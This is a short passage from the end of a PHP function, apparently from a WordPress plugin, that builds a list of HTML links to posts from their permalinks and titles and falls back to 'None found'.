			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>